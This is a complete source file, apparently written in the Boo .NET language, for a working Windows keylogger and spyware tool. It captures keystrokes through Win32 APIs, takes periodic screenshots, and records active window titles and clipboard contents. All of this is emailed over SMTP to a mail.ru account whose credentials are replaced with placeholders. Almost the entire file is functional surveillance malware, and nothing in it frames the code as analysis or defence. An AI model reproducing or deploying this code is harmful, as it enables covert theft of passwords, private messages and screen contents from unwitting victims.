import System
import System.IO
import System.Text
import System.Drawing
import System.Net.Mail
import System.Windows.Forms
import System.Runtime.InteropServices
import System.Linq.Enumerable from System.Core

static class INI:
	public max_shots	= 3
	public screen_time	= 5 * 1000
	public mail_user	= "I Am Error" # DATA EXPUNGED.
	public mail_server	= "mail.ru"
	public mail_port	= 2525
	public mail_pass	= "I Am Error" # DATA EXPUNGED.
	public timestamp	= "MM/dd/yyyy--HH`mm`ss"
	public max_quote	= 260
# -------------------- #
class KeyWatcher:
	final max_byte			= Byte.MaxValue + 1
	final my_thread			= GetCurrentThreadId()
	final arj				= array(bool, max_byte)
	final key_buffer		= array(byte, max_byte)
	alt_mod as bool; shift_mod as bool; ctrl_mod as bool

	# --Translation table goes here.
	final key_names = {
		Keys.Back :		"BCK"	, Keys.Tab:			"TAB"	, Keys.Escape:		"ESC" 	, Keys.Prior:		"PGUP"	,
		Keys.Next:		"PGDN"	, Keys.End:			"END"	, Keys.Home:		"HOME"	, Keys.Left:		"LEFT"	,
		Keys.Up:		"UP"	, Keys.Right:		"RIGHT"	, Keys.Down:		"DOWN"	, Keys.Delete:		"DEL" 	,
		Keys.Snapshot:	"PRTSCN", Keys.Pause:		"PAUSE" , Keys.LWin:		"LWIN"	, Keys.RWin:		"RWIN"	,
		Keys.Apps:		"APPS"	, Keys.Insert:		"INS"	,
		Keys.F1:		"F1"	, Keys.F2:			"F2"	, Keys.F3:			"F3"	, Keys.F4:			"F4"	,
		Keys.F5:		"F5"	, Keys.F6:			"F6"	, Keys.F7:			"F7"	, Keys.F8:			"F8"	,
		Keys.F9:		"F9"	, Keys.F10:			"F10"	, Keys.F11:			"F11"	, Keys.F12:			"F12"	,
		Keys.Control:	""		, Keys.Menu: 		""		, Keys.LControlKey:	""		, Keys.RControlKey:	""		,
		Keys.ShiftKey:	""		, Keys.LShiftKey:	""		, Keys.RShiftKey:	""		, Keys.LMenu:		""		,
		Keys.RMenu:	 	""
	}

	# --Import table goes here:
	[DllImport("user32.dll")]
	def GetAsyncKeyState(vKey as int) as short:
		pass
	[DllImport("kernel32.dll")]
	def GetCurrentThreadId() as uint:
		pass
	[DllImport("user32.dll")]
	def GetForegroundWindow() as IntPtr:
		pass
	[DllImport("user32.dll")]
	def GetWindowThreadProcessId(hWnd as IntPtr, ProcessId as IntPtr) as uint:
		pass
	[DllImport("user32.dll")]
	def GetKeyboardLayout(idThread as uint) as IntPtr:
		pass
	[DllImport("user32.dll")]
	def AttachThreadInput(idAttach as uint, idAttachTo as uint, fAttach as bool) as bool:
		pass
	[DllImport("user32.dll")]
	def GetKeyboardState(lpKeyState as (byte)) as bool:
		pass
	[DllImport("user32.dll")]
	def MapVirtualKey(uCode as uint, uMapType as uint) as uint:
		pass
	[DllImport("user32.dll")]
	def ToUnicodeEx(wVirtKey as uint, wScanCode as uint, lpKeyState as (byte), 
		[Out, MarshalAs(UnmanagedType.LPWStr)] pwszBuff as System.Text.StringBuilder, 
		cchBuff as int, wFlags as uint, dwhkl as IntPtr) as int:
		pass

	# --Methods goes here.
	def key_states():
		for key as int, old_state in enumerate(arj):
			continue if key < 8
			arj[key] = (GetAsyncKeyState(key) & Int16.MinValue) != 0
			yield key if arj[key] == false and old_state

	def specialize(sym):
		return "『$(sym)』"

	def key_format(key as string, check_shift as bool, force_format) as string:
		key_mod = ""
		def key_modding(test_flag, mod_name):
			key_mod += "$mod_name+" if test_flag
		if key: # If any id for key was present...
			key_modding(alt_mod	, "ALT")
			key_modding(ctrl_mod, "CTRL")
			if check_shift: key_modding(shift_mod, "SHIFT")
			if force_format or key_mod: return specialize(key_mod + key.ToUpper())
			else: return key
	# *Overload shims:
	def key_format(key as string, check_shift as bool) as string:
		return key_format(key, check_shift, false)
	# */shim

	def tick():
		def check_mod(key):
			return (key_buffer[key] & 0x80) != 0
		for key_hit as Keys in key_states():
			#.Preparation operations.
			win 		= GetForegroundWindow()
			thread		= GetWindowThreadProcessId(win, IntPtr.Zero)
			lay			= GetKeyboardLayout(thread)
			key_id		= StringBuilder()
			#.Actual data extraction.
			AttachThreadInput(my_thread, thread, true)
			GetKeyboardState(key_buffer)
			alt_mod, shift_mod, ctrl_mod = check_mod(Keys.Menu), check_mod(Keys.ShiftKey), check_mod(Keys.ControlKey)
			key_buffer[Keys.ControlKey] = 0
			#.Result formatting.
			if key_hit == Keys.Enter: 												
				yield key_format("ENTER", true, true)	+ "\r\n"					# Enter as rather special case.
			if key_names.Contains(key_hit):	
				if key_names[key_hit]: yield key_format(key_names[key_hit], true, true)	# Non-"" predetrmined key id.
			elif ToUnicodeEx(key_hit, MapVirtualKey(key_hit, 0), key_buffer, key_id, 5, 0 cast uint, lay):
				yield key_format(key_id.ToString(), false)							# Reconstructible key id.
			else: yield specialize("?")												# Undefined key id.
# -------------------- #
class ScreenWatch:
	public timer as System.Timers.Timer
	final arj = List[of ScreenShot]()
	public signal_period = 0
	ticks = 0

	# --Auxilary definitions goes here.
	class ScreenShot:
		public bitmap = MemoryStream()
		public date as DateTime
		public fresh as bool
		def timestamp():
			return self.date.ToString(INI.timestamp)

	# --Methods goes here.
	def constructor(signal_period):
		timer = System.Timers.Timer(signal_period)
		timer.Elapsed += tick
		timer.Start()

	def capture() as Bitmap:
		bounds	= Screen.GetBounds(Point.Empty)
		bmp		= Bitmap(bounds.Width, bounds.Height)
		using context = Graphics.FromImage(bmp):
			context.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size)
		return bmp

	def tick(sender, e as System.Timers.ElapsedEventArgs): # Event handler.
		shot = ScreenShot(date: e.SignalTime, fresh: true)
		capture().Save(shot.bitmap, System.Drawing.Imaging.ImageFormat.Jpeg)
		shot.bitmap.Position = 0; arj.Add(shot)

	def checkup() as ScreenShot*:
		for shot in arj:
			if shot.fresh:
				shot.fresh = false; yield shot

	def dump() as (ScreenShot):
		shots = arj.ToArray()
		arj.Clear()
		return shots
# -------------------- #
class DifferenceWatch:
	title_accum = ""; clip_accum = ""

	# --Import table goes here:
	[DllImport("user32.dll")]
	def GetWindowText(hWnd as IntPtr, lpString as StringBuilder, nMaxCount as int) as int:
		pass
	[DllImport("user32.dll")]
	def GetWindowTextLength(hWnd as IntPtr) as int:
		pass
	[DllImport("user32.dll")]
	def GetForegroundWindow() as IntPtr:
		pass

	# --Methods goes here:
	def win_title(hWnd as IntPtr) as string:
		length = GetWindowTextLength(hWnd); accum = StringBuilder(length + 1)
		GetWindowText(hWnd, accum, accum.Capacity)
		return accum.ToString()		

	win_changed as bool: # Procedural property.
		get:
			if (current_win = active_title) != title_accum:
				title_accum = current_win; return true

	active_title as string: # Procedural property.
		get:
			return win_title(GetForegroundWindow())

	clip_changed as bool: # Procedural property.
		get:			
			if (current_clip = clip_text) != clip_accum:
				clip_accum = current_clip; return true

	clip_text as string: # Procedural property.
		get:
			if Clipboard.ContainsText():
				if (text_content = Clipboard.GetText()).Length > INI.max_quote:
					text_content = text_content.Substring(0, INI.max_quote) + "●" * 3
				return text_content
# -------------------- #
class Mailer:
	email = ""
	property server as string
	property port as int
	property user as string
	property password as string
	final linkage = List[of SmtpClient]()
	final log_arj = List[of string]()

	# --Methods goes here.
	log_changed as bool:
		get: return log_arj.Count() != 0

	def log(text as string):
		log_arj.Add(text)

	def unlog() as string:
		entry = log_arj[0]
		log_arj.RemoveAt(0)
		return entry

	def unlink(sender as SmtpClient, e as System.ComponentModel.AsyncCompletedEventArgs):
		if e.Error:	log("[Error] unable to communicate with $email: $(e.Error.Message)")
		else:		log("Report fragment sent to $email [$(DateTime.Now.ToString)]")		
		sender.Dispose(); linkage.Remove(sender)

	def echo(fragment as string, shots as (ScreenWatch.ScreenShot)):
		fail_count = 0

		while fail_count < 6:
			try: 
				# Client initialization.
				link = SmtpClient(Host: "smtp.$server", Port: port, EnableSsl: true, \
				Credentials: System.Net.NetworkCredential(user, password),
				DeliveryMethod: SmtpDeliveryMethod.Network)
				link.SendCompleted += unlink

				# Mail initialization.
				email = "$user@$server"
				msg = MailMessage(email, email, "$(Environment.MachineName)/@/$(Environment.UserName)/@/" + \
					"$(DateTime.Now.ToString('MM.dd.yyyy, HH:mm'))", "")
				msg.Attachments.Add(Attachment(MemoryStream(Encoding.UTF8.GetBytes(fragment)), \
					"$(DateTime.Now.ToString(INI.timestamp)).txt", "text/plain"))
				for shot in shots:
					msg.Attachments.Add(Attachment(shot.bitmap, "$(shot.timestamp()).jpg", "image/jpg"))

				# Actual sending.				
				link.SendAsync(msg, null)
				linkage.Add(link)
				return true
				#############
			except: 
				fail_count++

		log("Critical smtp library error.")
# -------------------- #
class Logger:
	property signal_period	= 0
	final key_watch 		= KeyWatcher()
	final log_accum 		= StringBuilder()
	final scr_watch 		= ScreenWatch(INI.screen_time)
	final diff_watch		= DifferenceWatch()
	final mail_link			= Mailer(server: INI.mail_server, port: INI.mail_port, user: INI.mail_user, 
		password: INI.mail_pass)
	tacts = 0	

	# --Methods goes here.
	def constructor(period as int):
		log("\r\n==►$(Environment.MachineName)〚⇛〛$(Environment.UserName): " +\
		"$(DateTime.Now.ToString('MM/dd/yyyy, HH:mm')) - new session begun.")
		tacts = signal_period = period

	def extract_log() as string:
		log_text = log_accum.ToString(); log_accum.Clear(); return log_text

	def log(msg as string, add_src as bool):
		if add_src and diff_watch.win_changed: log("\r\n=►[$(diff_watch.active_title)]◄=\r\n")
		log_accum.Append(msg)
	# *Overload shims:
	def log(msg as string):
		log(msg, false)
	# */shim

	def mail_data():
		return mail_link.echo(extract_log(), scr_watch.dump())

	def tick():
		while true: 
			for kb_feed in key_watch.tick(): log(kb_feed, true)
			for ss_feed in scr_watch.checkup(): 
				log("\r\n▲▼screen/$(ss_feed.timestamp())/shot▼▲", true); tacts++
			if diff_watch.clip_changed: log("\r\n【◆►►$(diff_watch.clip_text)◄◄◆】\r\n", true)
			if tacts >= signal_period: tacts = 0; mail_data()
			if mail_link.log_changed: yield mail_link.unlog()

# ----Main code---- #
for report as string in (logger = Logger(INI.max_shots)).tick():
	print report